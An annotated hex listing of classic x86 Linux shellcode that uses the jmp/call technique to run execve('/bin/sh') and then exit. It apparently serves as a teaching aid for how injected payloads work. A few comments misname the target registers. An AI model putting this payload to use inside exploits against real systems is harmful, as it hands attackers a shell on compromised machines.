eb 2a                  #Jump down to The "CALL" op below
5e                     #Pop ESI (contains pointer to start of /bin/sh text)
89 76 08               #mov [esi+8], esi (8 bytes after /bin/sh text holds pointer to beginning of /bin/sh)
c6 46 07 00            #mov [esi+7], 0 (moving 0 into 7 bytes after the /bin/sh [wich null terminates])
c7 46 0c 00 00 00 00   #mov [esi+12,] 0 (zero out some bytes offset 12 from /bin/sh text)
b8 0b 00 00 00         #mov eax, 11 (syscall number for execing stuff)
89 f3                  #mov ebx, esi (ebx is pointer to command to run, esi contains that pointer)
8d 4e 08               #lea ecx, [esi +8] (value of esi + 8 gets loaded into eax, which is pointing to after /bin/sh)
8d 56 0c               #lea edx, [esi+12] (value of esi + 12 gets loaded into eax, which is pointing to a few bytes after /bin/sh)
cd 80                  #actually execute /bin/sh
b8 01 00 00 00         #syscall for exiting program
bb 00 00 00 00         #return value
cd 80                  #actually exit
e8 d1 ff ff	ff         #Call to 2nd instruction, this also indirectly gets the address of the data below onto the stack.
2f 62 69 6e 2f 73 68 00 89 ec 5d c3       #/bin/sh
